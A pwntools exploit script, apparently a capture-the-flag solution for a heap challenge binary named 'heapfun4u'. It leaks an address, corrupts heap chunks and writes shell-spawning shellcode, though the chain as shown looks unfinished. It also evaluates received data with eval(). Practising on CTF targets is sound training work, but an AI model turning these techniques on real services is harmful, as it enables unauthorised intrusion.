#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./heapfun4u"
#libc = ELF()
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("example.com", 4444)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
        # before menu select
        b *0x40143a
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)

def alloc(size):
    p.recvuntil("|")
    p.sendline('A')
    p.recvuntil("Size:")
    p.sendline(str(size))
    log.info("allocated: size = {}".format(size))

def free(index):
    p.recvuntil("|")
    p.sendline('F')
    p.recvuntil("Index:")
    p.sendline(str(index))
    log.info("free: index = {}".format(index))

def write(index, buffer):
    p.recvuntil("|")
    p.sendline('W')
    p.sendline(str(index))
    p.recvuntil("Write what:")
    p.sendline(buffer)
    log.info("write: index = {}".format(index))

def niceguy():
    p.recvuntil("|")
    p.sendline('N')
    p.recvuntil("Here you go: ")
    return eval(p.recv(14))

def exit_main():
    p.recvuntil("|")
    p.sendline('E')


# heap chunk struct
# +-------------+ 
# | chunk size  | at last one bit is using for check use or free
# +-------------+
# |    buffer   |
# +-------------+
# |   backward  |
# +-------------+
# |   forward   |
# +-------------+

leak = niceguy()
log.info("leak: 0x{:08x}".format(leak))
main_ret = leak + 0x104
log.info("main ret: 0x{:08x}".format(main_ret))
alloc(0x10)# index = 1
alloc(0x64)# 2
alloc(0x64)# 3
free(1)
shellcode = asm(shellcraft.sh())
write(3, shellcode)

p.interactive()
